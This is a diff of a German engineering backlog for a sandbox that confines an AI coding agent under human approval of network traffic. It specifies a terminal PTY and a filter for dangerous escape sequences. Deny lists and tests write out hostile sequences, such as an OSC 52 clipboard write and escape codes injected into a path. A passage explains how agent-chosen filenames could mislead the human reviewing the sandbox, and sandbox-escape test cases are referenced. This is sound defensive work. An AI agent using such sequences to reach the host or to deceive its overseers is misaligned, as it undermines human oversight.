+- Der Test-Fixture `/tmp/.X11-unix` scheitert schon am Profil (`SANDBOX_006`), nie an Check 2; `SANDBOX_012` hätte Exit 1, nicht 3.
+- `isolation.rs` (neu) und „Report-Pipe" existieren längst (`bwrap.rs:728`, `launcher.rs` `LaunchOnce.report`); die eine fehlende Datei, `ipc/src/sandbox.rs`, fehlte in der Pfadliste.
+- `SandboxEvent::IsolationResult` gibt es nicht; die Proto trägt `CheckResult` als `SandboxEvent.check` (Feld 2), und der Dart-Client verwirft den Fall heute (`grpc_daemon_client.dart`, `check_2`).
+- Weiter korrigiert: `NavIntent(4)` öffnete Audit (Index 4), Sandbox ist Index 3; ARB-Schlüssel camelCase; Satz 3 lautet nach `docs/SECURITY.md` Abschnitt 1 und BACKLOG.md 4.1 „opens no new door", nicht „refuses to open any new door"; `app.dart` hält keinen Header, der Ring steht in `header_bar.dart`; `configProvider` existiert nicht, der Endpoint steht in `SandboxStatus.llmEndpoint`; kein `socketpair`-Probe, kein socat, kein `/proc/net/unix`, kein `nftw`, keine Warteschleife, kein PID 1.
+
+**Offen, hier nicht entschieden:**
+
+- `docs/SECURITY.md` Abschnitt zu seccomp und CONVENTIONS 4.11 sagen „ESC-1 und HUM-041 Check 3 erwarten `socketpair` = ok". Der Shim probt `socketpair` nicht (`probe_families` in `main.rs`). Entweder kommt die Probe in `probe_families` dazu, oder beide Dokumente streichen den Halbsatz „HUM-041 Check 3" im selben Commit. Dieses Issue nimmt die Probe nicht auf, weil es am Shim nichts ändert.
+- Die Rolle des vierten Zustands „läuft" (Amber pulsierend): `Inner::start` sendet heute `starting` und `running` ohne Zwischenzustand; die drei Check-Ereignisse dazwischen sind der Zustand.
+
+**Seit dem Audit überholt:** HUM-040 ist gemerged (`7fcafd0`). `app/lib/features/sandbox/` ist kein Platzhalter mehr; der Reiter `SandboxTab.isolation` zeigt `ComingPane` mit `sandboxIsolationPlaceholder` (`sandbox_screen.dart`), `sandboxStatusProvider`, `SandboxStatus.llmEndpoint`, `argvPreview` und `diagnostics` stehen. CONVENTIONS 4.17 (Sandbox-Bildschirm) nennt Isolations-Reiter und Terminal ausdrücklich als erklärte Platzhalter.
+
+**Aus dem Audit nicht bestätigt oder verschoben:** Zeilenanker in `ipc/src/sandbox.rs` (Dispatch heute um Zeile 310, nicht 151) und `sandbox.dart`; die Aussage, `daemon/crates/sandbox/src/handle.rs` dokumentiere in Zeile 394 die Signalzustellung an das Namespace-Init, konnte über die Suchbegriffe nicht bestätigt werden (die Stelle `kill_process_group(pid, Signal::INT)` in `interrupt` existiert).
+
+**Feindliche Eingabe:** `evidence` ist die eine Stelle. Der Suchlauf listet Socket-Dateinamen aus `/work`, und der Name landet als Text neben einem roten Punkt genau dort, wo ein Mensch entscheidet, ob er der Sandbox glaubt. `report::sanitize` macht Whitespace zu `_` (eine zweite `CHECK`-Zeile ist damit nicht fälschbar; Test dafür beibehalten), lässt aber U+202E, U+200B, U+FEFF durch. Die Säuberung in `convert.rs` und die Längendeckelung sind deshalb Teil des Daemon-Schritts, nicht Kür. Zweite Grenze: `parse_check_line` liefert bei einer unlesbaren Zeile `None`, und `check_from` wertet eine fehlende Zeile als `passed: false`; diese Richtung darf niemand in „unbekannt heißt gut" lockern.
 
 ### Fallstricke
-- Check 3 muss **nach** dem seccomp-Aufruf laufen, Check 2 **davor** (die `nftw`-Suche braucht keine Sockets, aber `connect()` zum Warten auf socat braucht `socket()`, und das ist nach dem Filter verboten). Reihenfolge ist Sicherheitsrelevant: Warten auf socat, dann Checks 1–2, dann seccomp, dann Check 3, dann exec.
-- `/proc/net/unix` zeigt im neuen Netz-Namespace nur Sockets dieses Namespaces; filesystem-Sockets aus Bind-Mounts erscheinen dort erst nach `connect()`. Deshalb zusätzlich der Dateisystem-Walk.
-- `nftw` über `/work` kann bei großen Projekten langsam sein: Tiefe 8, und `/work` wird nur bis Tiefe 3 durchsucht (Sockets im Projekt sind unüblich, aber ein `.sock` in `/work` wäre ein Fund).
-- Report-FD darf nicht der Terminal-PTY sein. FD 3 wird explizit übergeben; der Shim schließt alle FDs > 3 vor `exec` außer den socat-Kindern.
+- Reihenfolge im Shim ist sicherheitsrelevant und steht fest: Brücke binden, Checks 1 und 2, seccomp, Kind mit Check 3, `exec`. Check 3 muss **nach** dem Filter laufen (er beweist den Filter), Check 2 **davor**.
+- Der Suchlauf über `/work` ist mit Budget (Tiefe 3, 2000 Einträge). Auf einem großen Projekt meldet er `limit=entries`; das ist kein Fehler, aber auch kein Beweis, und das Panel sagt es.
+- `HUMANITL_REPORT_FD` darf nicht das Terminal-PTY sein; der Shim schließt vor `exec` alle geerbten Deskriptoren außer dem Bericht (`close_inherited`).
+- `Diagnostic` reist als `SandboxEvent.diagnostic`, nicht als Text. Ein `CheckResult.diagnostic` ohne `why` gibt es nicht (`DiagnosticBuilder`).
 - Wenn bwrap ohne User-Namespaces läuft (setuid-Variante), stimmt alles trotzdem; wenn `bwrap` fehlt, greift `SANDBOX_001` aus HUM-011.
 
 ### Referenzen
-BACKLOG.md 4.1, 4.5 (ESC-1, ESC-2), Abschnitt 5 (Signature-Element Isolation Ring, Usability §4); CONVENTIONS.md 3.4, 3.11. `seccomp(2)`, `proc(5)` Abschnitt `/proc/net/unix`.
+BACKLOG.md 4.1, 4.5 (ESC-1, ESC-2), Abschnitt 5 (Signature-Element Isolation Ring, Usability §4); CONVENTIONS.md 3.4, 3.11, 4.11, 4.12, 4.13, 4.17; `docs/SECURITY.md` Abschnitt 1. `seccomp(2)`, `proc(5)`.
 
 ---
 
 ## HUM-042 · Terminal
-Sprint: 3 · Größe: L · Abhängigkeiten: HUM-011, HUM-012, HUM-018, HUM-040 · Blockiert: HUM-067, HUM-046
+Sprint: 3 · Größe: XL · Abhängigkeiten: HUM-011, HUM-012, HUM-018, HUM-040 · Blockiert: HUM-067, HUM-046
 
 ### Kontext
-Der Nutzer arbeitet mit dem Agenten im Terminal. Das PTY muss im Daemon leben, weil dort bwrap läuft und weil die UI im Flatpak später keinen Zugriff auf den Host hat (ADR-003). Sicherheitsreview: Terminal-Ausgabe ist ein Seitenkanal (OSC 52 schreibt ins Host-Clipboard, OSC 8 baut anklickbare Links, Titel-Sequenzen fälschen Fenster). Der Daemon filtert, nicht die UI.
+Der Nutzer arbeitet mit dem Agenten im Terminal. Das PTY muss im Daemon leben, weil dort bwrap läuft und weil die UI im Flatpak später keinen Zugriff auf den Host hat (ADR-003). Sicherheitsreview: Terminal-Ausgabe ist ein Seitenkanal (OSC 52 schreibt ins Host-Clipboard, OSC 8 baut anklickbare Links, Titel-Sequenzen fälschen Fenster). Der Daemon filtert den Bytestrom für jeden Client; das Widget registriert zusätzlich keinen OSC-Handler. Beides zusammen ist die Minderung von K-09; `docs/THREAT-MODEL.md` und BACKLOG.md 4.2 nennen heute nur das Widget und werden im selben Commit nachgezogen.
 
 ### Ziel
-Der Daemon öffnet für jede Session ein PTY, startet bwrap darin, und exponiert einen gRPC-Bidi-Stream `Terminal`. Die Flutter-App rendert den Stream mit `xterm2`, sendet Tastatureingaben und Resize. Der Daemon filtert die Ausgabe byteweise gegen eine Liste verbotener Escape-Sequenzen. Wenn ein Flow gehalten wird, schreibt der Daemon eine Zeile ins Terminal, damit der Nutzer es auch vom Agenten aus sieht.
+Der Daemon startet die Sandbox für jede Session an einem PTY, und der bestehende gRPC-Bidi-Stream `Terminal` liefert dessen Ausgabe. Die Flutter-App rendert den Stream mit `xterm2`, sendet Tastatureingaben und Resize. Der Daemon filtert die Ausgabe byteweise gegen eine Liste verbotener Escape-Sequenzen. Wenn ein Flow gehalten wird, zeigt die Oberfläche das auch vom Terminal aus.
 
 ### Nicht-Ziel
-Kein Terminal-Multiplexing (nur ein Client pro Session). Kein lokales PTY in Flutter (`flutter_pty` wird nicht verwendet). Keine Scrollback-Persistenz über Neustart hinaus.
+Kein zweiter schreibender Client: genau ein Schreiber, beliebig viele Leser (`TerminalInput.Open.read_only`), Geometrie des Schreibers, Leser rendern letterboxed (CONVENTIONS 4.10; das ersetzt „nur ein Client pro Session"). Kein lokales PTY in Flutter (`flutter_pty` wird nicht verwendet). Keine Scrollback-Persistenz über Neustart hinaus. Keine Proto-Änderung: der Vertrag ist committet und reicht.
 
 ### Betroffene Pfade
-- `daemon/crates/sandbox/src/pty.rs` (neu): PTY-Erzeugung mit `nix::pty::openpty`, Größe, Kindprozess-Anbindung
+- `daemon/crates/sandbox/src/launcher.rs`: `StdioMode::Pty { cols, rows }` neben `Inherit` und `Capture`
+- `daemon/crates/sandbox/src/bwrap.rs`: `supervise` öffnet das PTY über `rustix::pty`, gibt den Slave als `Stdio::from(OwnedFd)` an bwrap und reicht den Master über den `SandboxHandle` heraus
+- `daemon/crates/sandbox/src/handle.rs`: Master-Deskriptor, `resize(cols, rows)`
+- `daemon/crates/sandbox/Cargo.toml`: `rustix`-Features `pty` und `termios` zusätzlich zu `fs`, `process` (die Versionszeile liegt noch in der Crate, nicht in `[workspace.dependencies]`; `daemon/Cargo.toml` fasst nur der Elternagent an)
 - `daemon/crates/sandbox/src/osc_filter.rs` (neu): Byte-Filter
-- `daemon/crates/ipc/src/terminal.rs` (neu): Bidi-Handler
-- `proto/humanitl/v1/humanitl.proto`: `TerminalInput { oneof { bytes data; Resize resize; bool detach } }`, `Resize { uint32 cols; uint32 rows }`, `TerminalOutput { oneof { bytes data; Exit exit; Notice notice } }`, `Exit { int32 code; string signal }`, `Notice { string text }`
-- `app/lib/features/sandbox/widgets/terminal_pane.dart` (neu)
-- `app/lib/features/sandbox/providers/terminal_provider.dart` (neu)
-- `app/pubspec.yaml`: `xterm2`
-- `daemon/crates/sandbox/tests/pty.rs`, `daemon/crates/sandbox/tests/osc_filter.rs`
+- `daemon/crates/ipc/src/terminal.rs` (neu): Bidi-Handler; `daemon/crates/ipc/src/server.rs` ersetzt `Err(unimplemented("Terminal", "HUM-042"))`; `daemon/crates/ipc/src/sandbox.rs` bekommt einen öffentlichen Zugang zum PTY der laufenden Sandbox (`running_handle` ist privat)
+- `daemon/crates/config/src/model.rs`: `ui.terminal_notices` auf `UiConfig` (`deny_unknown_fields`; ohne das Feld ist der Schlüssel `CONFIG_002`), `docs/CONFIG.md` neu erzeugt mit `UPDATE_CONFIG_DOCS=1 cargo test -p humanitl-config --test config_docs`
+- `daemon/bin/humanitl/src/cli.rs`, `cmd/sandbox.rs`: `humanitl sandbox attach [--read-only]` (ADR-018, ARCHITECTURE 3b: ein neuer RPC-Handler bringt sein Subkommando mit)
+- `app/pubspec.yaml`, `app/pubspec.lock`: `xterm2` (heute in keinem Manifest)
+- `app/lib/core/ipc/daemon_client.dart`, `grpc_daemon_client.dart`, `fake_daemon_client.dart`: erste Client-Streaming-Methode `terminal(Stream<TerminalInput>)` (der Dart-Stub in `humanitl.pbgrpc.dart` ist generiert)
+- `app/lib/features/sandbox/widgets/terminal_pane.dart` (neu), `providers/terminal_provider.dart` (neu)
+- `app/packages/ui`: `HContextMenu` (fehlt; ADR-0009 beziffert es mit 1 d und nennt HUM-030 als zweiten Nutzer) und eine 16-Farben-Terminalpalette auf `HTokens` (heute kein `terminalTheme`)
+- `app/l10n/app_en.arb`, `app_de.arb`: `sandboxTerminalUntrustedBanner`; `sandboxTerminalPlaceholder` entfällt
+- `docs/THREAT-MODEL.md` K-09, BACKLOG.md 4.2: Minderung als Daemon-Filter plus Widget
+- `tests/escape/esc-5-filesystem.sh`: die zwei OSC-Fälle sind heute `skip` mit Zuschreibung HUM-050 (Kopf und Zeilen 19–20); gehört HUM-042. HUM-043 bearbeitet dieselbe Datei, Reihenfolge absprechen.
+- `daemon/crates/sandbox/tests/osc_filter.rs`; der PTY-Test läuft über `BwrapBackend::plan`, weil `LaunchPlan` außerhalb der Crate nicht baubar ist (`program`, `once` sind `pub(crate)`)
+
+Gestrichen: `daemon/crates/sandbox/src/pty.rs` mit `nix::pty::openpty` (`nix` steht in keinem Manifest; die Crate hat `#![forbid(unsafe_code)]`, und `fork`/`dup2`/`TIOCSCTTY` brauchen `unsafe`), die Proto-Zeile (`Notice`, `detach`, `Exit.signal` gibt es nicht, siehe Spezifikation).
 
 ### Spezifikation
 
-PTY:
+**Der Vertrag ist committet** (`proto/humanitl/v1/humanitl.proto`, gepinnt durch `proto/descriptor.binpb`, `proto/generated.sha256`, `daemon/crates/ipc/tests/proto_contract.rs`) und wird nicht angefasst:
 
-```rust
-pub struct PtySession { master: OwnedFd, child: Pid, size: Mutex<(u16,u16)> }
-impl PtySession {
-    pub fn spawn(plan: &LaunchPlan, initial: (u16,u16)) -> Result<Self, Diagnostic>;   // openpty, fork, setsid, TIOCSCTTY, dup2 slave -> 0/1/2, exec bwrap argv
-    pub fn resize(&self, cols: u16, rows: u16) -> nix::Result<()>;                        // TIOCSWINSZ, then SIGWINCH to child
-    pub fn writer(&self) -> impl AsyncWrite;     // tokio AsyncFd over master
-    pub fn reader(&self) -> impl AsyncRead;
-    pub async fn wait(&self) -> ExitStatus;
-}
+```
+TerminalInput  { oneof { Open open = 1; bytes data = 2; Resize resize = 3; google.protobuf.Empty close = 4 } }
+TerminalInput.Open { string sandbox_id; uint32 cols; uint32 rows; bool read_only }
+TerminalOutput { oneof { bytes data = 1; Exit exit = 2; Diagnostic diagnostic = 3; Resize resize = 4 } }
+TerminalOutput.Exit { int32 code }
 ```
 
-Environment für das PTY-Kind: `TERM=xterm-256color`, `COLUMNS`/`LINES` nicht setzen (TIOCSWINSZ reicht). Master-FD nicht-blockierend, `tokio::io::unix::AsyncFd`.
+Kein `Notice`, kein `detach`, kein `Exit.signal`. Hinweise reisen als `data`, `TERM_001` als `diagnostic`, das Ende des Streams ohne Schließen des PTY als `close`. `daemon/crates/ipc/src/fake/mod.rs` (`echo_terminal`) implementiert diese Form schon und ist die Referenz.
 
-Bidi-Handler: Genau ein aktiver Client pro Session. Ein zweiter `Terminal`-Aufruf mit derselben `session_id` erhält `Status::already_exists` mit Message `TERM_001`. Beim Verbinden sendet der Daemon zuerst die letzten 64 KiB Scrollback (Ringpuffer im Daemon), dann live. `detach` beendet den Stream ohne das PTY zu schließen. Session-Ende ⇒ `Exit { code, signal }` und Stream-Ende.
+PTY ist ein Modus des einen Launchers, kein zweiter:
 
-Resize-Ordnung: Client sendet `Resize` vor dem ersten `data`. Der Daemon wendet Resize an, bevor er die Scrollback-Bytes sendet. Resize-Events werden im Daemon gedrosselt: maximal eines pro 50 ms, das letzte gewinnt.
+```rust
+pub enum StdioMode { Inherit, Capture, Pty { cols: u16, rows: u16 } }
+// SandboxHandle: pub fn pty_master(&self) -> Option<&OwnedFd>; pub fn resize(&self, cols: u16, rows: u16) -> Result<(), Diagnostic>
+```
+
+`supervise` (`bwrap.rs`) öffnet das PTY mit `rustix::pty::openpt`/`grantpt`/`unlockpt`, hängt den Slave als stdin/stdout/stderr an das `Command` (`Stdio::from(OwnedFd)`, kein `unsafe`), schließt seine eigene Kopie des Slaves sofort nach dem Spawn (sonst sieht der Master nie EOF) und behandelt `EIO` auf dem Master als EOF. `setsid` macht bwrap selbst (`--new-session`, in jeder Kommandozeile, nicht abschaltbar). Die Startdiagnostik bleibt erhalten: `Shared::verdict` (`handle.rs`) erkennt `SANDBOX_003` aus dem aufgefangenen stderr; mit PTY muss das erste 2 KiB der Master-Ausgabe in `append_stderr` gespiegelt werden, sonst verlieren `is_userns_failure` und der `SANDBOX_012`-Auszug ihre Quelle.
+
+`resize` ist `rustix::termios::tcsetwinsize` auf dem Master, gefolgt von `kill_process_group(child_pid, Signal::WINCH)` (das Muster steht in `SandboxHandle::interrupt`). Grund: Die Sandbox läuft mit `--new-session`, hat also kein steuerndes Terminal (`docs/THREAT-MODEL.md`, Absatz zu `TIOCSTI`), `TIOCSWINSZ` erzeugt deshalb kein `SIGWINCH`, und ein Signal an die bwrap-PID allein wäre eines an das Init des PID-Namensraums. Folge für Ctrl+C: er erreicht den Agenten nur als Byte 0x03 im Raw-Modus, nie als tty-erzeugtes `SIGINT`. `humanitl-sandbox` bleibt ohne `tokio`; `crates/ipc` legt `tokio::io::unix::AsyncFd` um den Master.
+
+Bidi-Handler (`daemon/crates/ipc/src/terminal.rs`): Schlüssel ist `Open.sandbox_id`. Ein Schreiber, beliebig viele Leser. Ein zweites `Open { read_only: false }` bekommt `TerminalOutput.diagnostic` mit `TERM_001` („Zweiter schreibender Terminal-Client abgelehnt", `codes.rs`) und der Stream endet; Leser werden immer angenommen. Geometrie kommt mit `Open` (das ist per Bau die erste Nachricht; ein vorangestelltes `Resize` ist nicht das Protokoll) und wird angewendet, bevor der Ringpuffer (64 KiB **gefilterter** Bytes) wiederholt wird; danach live. `data` und `Resize` eines Lesers werden verworfen. Schreiber-Resizes sind auf eines je 50 ms gedrosselt, das letzte gewinnt, und jeder Leser erhält die neue Geometrie als `TerminalOutput.Resize`. `close` beendet den Stream, ohne das PTY zu schließen. Session-Ende ⇒ `Exit { code }` und Stream-Ende. Ohne laufende Sandbox antwortet `terminal` wie `sandbox()` mit `IPC_006`.
 
 OSC-Filter (`osc_filter.rs`), zustandsbehafteter Byte-Filter, der über beliebige Chunk-Grenzen funktioniert:
 
@@ -985,187 +1040,279 @@ impl OscFilter {
     pub fn new(policy: OscPolicy) -> Self;
     /// Feeds bytes, returns the bytes to forward. Never reorders. Blocks only complete forbidden sequences.
     pub fn feed(&mut self, input: &[u8]) -> Vec<u8>;
+    /// True between sequences; the notice injector needs it.
+    pub fn at_boundary(&self) -> bool;
 }
 pub struct OscPolicy { pub deny: Vec<u16> }   // OSC numbers; default [0, 1, 2, 7, 8, 9, 52, 777, 1337]
 ```
 
-Grammatik: `ESC ] <num> ; <payload> (BEL | ESC \)`. Der Filter erkennt `ESC ]`, sammelt bis zum Terminator (max. 64 KiB, danach verwerfen), prüft `<num>` gegen `deny`. Verbotene Sequenz wird komplett entfernt; erlaubte (z. B. OSC 4/10/11 Farben, OSC 133 Prompt-Marker) werden unverändert durchgereicht. Zusätzlich entfernt: `ESC c` (RIS, Terminal-Reset) und DCS-Sequenzen (`ESC P ... ESC \`), da xterm2 sie nicht braucht und sie Sixel-Uploads tragen könnten. CSI/SGR bleiben unangetastet. Der Filter ist die einzige Stelle, die Terminalbytes verändert; er läuft im Daemon vor dem Recorder-Mirror (Terminal-Ausgabe wird nicht aufgezeichnet im MVP, nur der Ringpuffer).
+Grammatik: `ESC ] <num> ; <payload> (BEL | ESC \)`. Der Filter erkennt `ESC ]`, sammelt bis zum Terminator (max. 64 KiB, danach verwerfen), prüft `<num>` gegen `deny`. Verbotene Sequenz wird komplett entfernt; erlaubte (z. B. OSC 4/10/11 Farben, OSC 133 Prompt-Marker) werden unverändert durchgereicht. Zusätzlich entfernt: `ESC c` (RIS), DCS (`ESC P … ESC \`), und — in der ersten Fassung vergessen — APC (`ESC _`), PM (`ESC ^`), SOS (`ESC X`), weil kitty-Grafik und das iTerm2-Dateiprotokoll über APC reisen. CSI/SGR bleiben unangetastet. Der Filter ist die einzige Stelle, die Terminalbytes verändert; der Ringpuffer hält nur gefilterte Bytes, sonst spielte ein Re-Attach den Rohstrom ab.
 
-Notice bei gehaltenem Flow: Der Proxy sendet an den Terminal-Handler `Notice { text }`; der Handler schreibt `\r\n\x1b[2m[humanitl] request held: {method} {host}{path_truncated} · waiting for you\x1b[0m\r\n` in den Ausgabestream (nicht ins PTY, damit der Agent es nicht als Eingabe sieht). Bei Entscheidung: `[humanitl] allowed` / `blocked` / `timed out`. Konfigurierbar über `ui.terminal_notices` (Default `true`, Tier `advanced`).
+Hinweis bei gehaltenem Flow: kein neuer Kanal und keine Richtung Proxy → Terminal (ARCHITECTURE 1.2: „Niemand fragt den Proxy nach seinem Zustand, alle hören zu"). Der Handler abonniert `HoldQueue::subscribe()` (`daemon/crates/proxy/src/hold.rs`) und löst Methode, Host und Pfad über `FlowRegistry::get(flow_id)` auf, denn `FlowEvent::Held` trägt nur `flow_id`, `at`, `deadline`, `queue_bytes`, `queue_count`. Die Zeile `[humanitl] request held: {method} {host}{path_truncated} · waiting for you` (dann `allowed` / `blocked` / `timed out`) läuft **als Ganzes** durch `humanitl_core::block::sanitize_note` und der Pfad wird hart gekürzt, bevor ein Byte in den Strom geht — `HttpRequest.path_and_query` ist roher Text von der Leitung, nur der Host ist über `HostName::parse` schon ASCII. Eingefügt wird nur, wenn `at_boundary()` gilt, damit der Hinweis nie in eine halb geschriebene Escape-Sequenz des Agenten fällt. Konfigurierbar über `ui.terminal_notices` (Default `true`, Tier `advanced`).
+
+Sichtbarkeit: OpenCode ist ein Vollbild-TUI (`OpenCodeAdapter::is_fullscreen_tui()` = `true`), das mit absoluter Adressierung neu zeichnet; eine `\r\n…\r\n`-Zeile im selben Bytestrom landet, wo der Cursor gerade steht, und ist mit dem nächsten Frame weg. Der Hinweis wird deshalb **zusätzlich außerhalb des Emulators** gezeigt: ein Streifen in `TerminalPane` aus demselben Ereignis (`HRow`, wie `sandboxLogProvider` es schon kann). Das Akzeptanzkriterium hängt am Streifen, nicht an der Zeile im Strom.
 
 Flutter `TerminalPane`:
 
 ```dart
 class TerminalPane extends ConsumerStatefulWidget { ... }
-// build: TerminalView(terminal, controller: ..., autoResize: true, theme: HTokens.terminalTheme, textStyle: JetBrains Mono 13)
-// terminal.onOutput -> ref.read(terminalProvider(sessionId).notifier).sendInput(bytes)
+// build: TerminalView(terminal, controller: ..., autoResize: true, theme: <Palette aus HTokens>, textStyle: HType.monoFamily 13)
+// Öffnen: Geometrie messen, dann Open{sandbox_id, cols, rows, read_only: false}; danach data / Resize
+// terminal.onOutput -> ref.read(terminalProvider(sandboxId).notifier).sendInput(bytes)
 // terminal.onResize -> sendResize(cols, rows)
-// stream.listen: data -> terminal.write(utf8.decode(data, allowMalformed: true)); notice -> terminal.write(...) ; exit -> banner
+// stream.listen: data -> terminal.write(utf8.decode(data, allowMalformed: true)); diagnostic -> Karte; exit -> Banner
 ```
 
-Banner über dem Terminal (HRow, 24 px, `bg-2`, `fg-1`): ARB `terminal_untrusted_banner` en "Agent output is untrusted. Clipboard and link sequences are filtered." / de "Agent-Ausgabe ist nicht vertrauenswürdig. Zwischenablage- und Link-Sequenzen werden gefiltert." xterm2-Terminal-Optionen: `Terminal(maxLines: 10000)`, OSC-Handler nicht registrieren (kein `onTitleChange`-Effekt), Rechtsklick-Menü mit Copy/Paste (Copy aus Selektion ist erlaubt, das ist eine Nutzeraktion).
+Banner über dem Terminal (HRow, 24 px, `bg-2`, `fg-1`): ARB `sandboxTerminalUntrustedBanner` en "Agent output is untrusted. Clipboard and link sequences are filtered." / de "Agent-Ausgabe ist nicht vertrauenswürdig. Zwischenablage- und Link-Sequenzen werden gefiltert." xterm2-Terminal-Optionen: `Terminal(maxLines: 10000)`, OSC-Handler nicht registrieren (kein `onTitleChange`-Effekt). Rechtsklick-Menü mit Copy/Paste über `HContextMenu` aus `app/packages/ui` (Copy aus Selektion ist erlaubt, das ist eine Nutzeraktion); wer das Menü aus diesem Issue nimmt, schreibt das hier hin.
 
 ### Schritte
-1. `pty.rs` mit `openpty`, fork/exec, Resize, AsyncFd. Test: `sh -c 'stty size; echo hi'` liefert `24 80` und `hi`.
-2. `osc_filter.rs` mit Tabellen-Tests.
-3. Bidi-Handler mit Ringpuffer, Ein-Client-Regel, Resize-Drossel, Notice-Kanal (`mpsc` vom Proxy).
-4. Proto-Erweiterung, Codegen.
-5. Flutter: Provider (öffnet Stream bei `sessionId` ≠ null), Pane, Banner, Theme aus Tokens, Fokus-Handling (Terminal bekommt Fokus beim Betreten des Screens, gibt ihn bei `Ctrl+1..5` ab).
-6. Integrationstest mit echtem Daemon: Eingabe `echo $TERM\n`, Ausgabe enthält `xterm-256color`.
+1. Spezifikation ist bereinigt (siehe Stand). Vorher mit dem Projekteigentümer die `--new-session`-Frage festhalten: Flag bleibt (Empfehlung; sonst ADR plus `docs/SECURITY.md` und `docs/THREAT-MODEL.md` im selben Commit, weil `TIOCSTI` wieder offen wäre), `SIGWINCH` liefert der Daemon selbst.
+2. `rustix`-Features `pty`, `termios` in `daemon/crates/sandbox/Cargo.toml`; `StdioMode::Pty`, Slave an `supervise`, Master und `resize` am `SandboxHandle`, stderr-Spiegel für `Shared::verdict`. Test über `BwrapBackend::plan` mit `tput cols` in der Sandbox (bwrap 0.12.0 ist installiert, `MIN_BWRAP_VERSION` 0.8.0).
+3. `osc_filter.rs` als reiner Zustandsautomat mit Tabellen-Tests, ohne IO.
+4. `ipc/src/terminal.rs`: Broadcast gefilterter Chunks, Ringpuffer, Schreiber-Slot, Lesermenge, Drossel, `TERM_001`; Hinweiszeile aus `HoldQueue::subscribe()` + `FlowRegistry::get`, durch `sanitize_note`, nur an Grenzen.
+5. `ui.terminal_notices` in `UiConfig`, `docs/CONFIG.md` neu erzeugen.
+6. `IpcServer::terminal` verdrahten, Zugang in `SandboxService`, `IPC_006` ohne Sandbox; `humanitl sandbox attach [--read-only]`.
+7. Flutter: `xterm2`, Bidi-Methode in `DaemonClient`/`GrpcDaemonClient`/`FakeDaemonClient` (geteilte Datei: neu lesen, anhängen), Provider, Pane, Banner, Hinweis-Streifen, Palette auf `HTokens`, `HContextMenu`, Fokus-Handling (Terminal bekommt Fokus beim Betreten des Screens, gibt ihn bei `Ctrl+1..5` ab).
+8. `esc-5-filesystem.sh`: Zuschreibung HUM-050 → HUM-042 in Kopf und beiden Zeilen, `osc52_does_not_reach_host` und `osc8_and_title_are_inert` echt; `docs/THREAT-MODEL.md` K-09 und BACKLOG.md 4.2 nachziehen.
+9. Integrationstest mit echtem Daemon: Eingabe `echo $TERM\n`, Ausgabe enthält `xterm-256color`.
 
 ### Tests
 - `osc52_removed_across_chunks`: Sequenz `ESC ] 52 ; c ; base64 BEL` in zwei Chunks geteilt ⇒ Ausgabe enthält sie nicht, umliegender Text unverändert.
-- `osc8_removed`, `osc0_title_removed`, `osc133_passes`, `sgr_passes`, `ris_removed`, `dcs_removed`.
+- `osc8_removed`, `osc0_title_removed`, `osc133_passes`, `sgr_passes`, `ris_removed`, `dcs_removed`, `apc_removed`, `pm_removed`, `sos_removed`.
 - `unterminated_osc_dropped_after_cap`: 70 KiB ohne Terminator ⇒ verworfen, Filter erholt sich.
-- `pty_resize_reaches_child`: `resize(120, 40)` ⇒ `stty size` im Kind liefert `40 120`.
-- `second_client_rejected`: zweiter Stream ⇒ `TERM_001`.
-- `scrollback_replayed_on_attach`: 1000 Zeilen Ausgabe, Attach ⇒ Client erhält die letzten 64 KiB.
-- Widget: Banner sichtbar; Eingabe `a` sendet `[0x61]`.
+- `pty_resize_reaches_child`: `resize(120, 40)` ⇒ `tput cols` in der Sandbox liefert `120`.
+- `second_writer_rejected`: zweites `Open{read_only:false}` ⇒ `TERM_001` als `diagnostic`. `second_reader_accepted`, `reader_cannot_write`, `reader_resize_ignored`.
+- `scrollback_replayed_on_attach`: 1000 Zeilen Ausgabe, Attach ⇒ Client erhält die letzten 64 KiB, gefiltert.
+- `notice_is_sanitized`: Pfad mit `\r`, `\x1b[2K` und `\x1b]52;c;…\x07` ⇒ genau eine `[humanitl]`-Zeile, kein `ESC ]` im Strom.
+- Widget: Banner sichtbar; Eingabe `a` sendet `[0x61]`; Hinweis-Streifen erscheint bei `Held`.
 
 ### Akzeptanzkriterien
-- [ ] OpenCode-TUI ist im Flutter-Terminal bedienbar (Pfeiltasten, Enter, Ctrl+C), Farben stimmen.
-- [ ] `printf '\e]52;c;SGVsbG8=\a'` in der Sandbox ändert das Host-Clipboard nicht (ESC-5 Terminalteil grün).
-- [ ] Gehaltener Flow erzeugt eine `[humanitl] request held` Zeile im Terminal.
-- [ ] Fenster-Resize im UI ändert die Spaltenzahl im Agenten ohne Zeilensalat (Test mit `tput cols`).
-- [ ] Detach und Re-Attach zeigen den Scrollback.
+- [ ] OpenCode-TUI ist im Flutter-Terminal bedienbar (Pfeiltasten, Enter, Ctrl+C als Byte 0x03), Farben stimmen.
+- [ ] `printf '\e]52;c;SGVsbG8=\a'` in der Sandbox ändert das Host-Clipboard nicht (ESC-5, `osc52_does_not_reach_host` und `osc8_and_title_are_inert` grün, nicht mehr `skip`).
+- [ ] Gehaltener Flow erzeugt den Hinweis im Streifen über dem Terminal und, wenn `ui.terminal_notices` gilt, die gesäuberte Zeile im Strom.
+- [ ] Fenster-Resize im UI ändert die Spaltenzahl im Agenten ohne Zeilensalat (`tput cols`).
+- [ ] `close` und erneutes `Open` zeigen den Scrollback; ein zweiter Leser sieht dasselbe wie der Schreiber, kann aber nichts senden.
+- [ ] `humanitl sandbox attach --read-only` zeigt die laufende Sitzung.
+
+### Stand (2026-09-04): Größe XL, der Vertrag ist da und besser als die Spezifikation, der Rest ist ungebaut
+
+Audit von 28 Agenten gegen den Code: 17 Widersprüche, 5 blockierend, oben im Text korrigiert. Gebaut ist der Vertrag (`proto/humanitl/v1/humanitl.proto`, Terminal-Nachrichten; Dart-Stub in `humanitl.pbgrpc.dart`; `DaemonApi::terminal` und `plain_stream` in `server_stub.rs`; `echo_terminal` im Fake), der Stub `IpcServer::terminal` mit `unimplemented("Terminal", "HUM-042")`, `TERM_001` im Register, `StdioMode { Inherit, Capture }` mit dem Hinweis auf dieses Issue, `supervise` als einziger Spawn-Punkt, `SandboxHandle` mit `kill_process_group`, `HoldQueue::subscribe()` und `FlowRegistry::get`, `sanitize_note`, `sandboxLogProvider` und `SandboxTab`. Ungebaut: PTY, Filter, Handler, `ui.terminal_notices`, `xterm2`, Bidi-Client, Pane, Kontextmenü, Palette, CLI-Hälfte, Escape-Fälle. Daher XL statt L.
+
+**Blockierend in der ersten Fassung, jetzt korrigiert:**
+
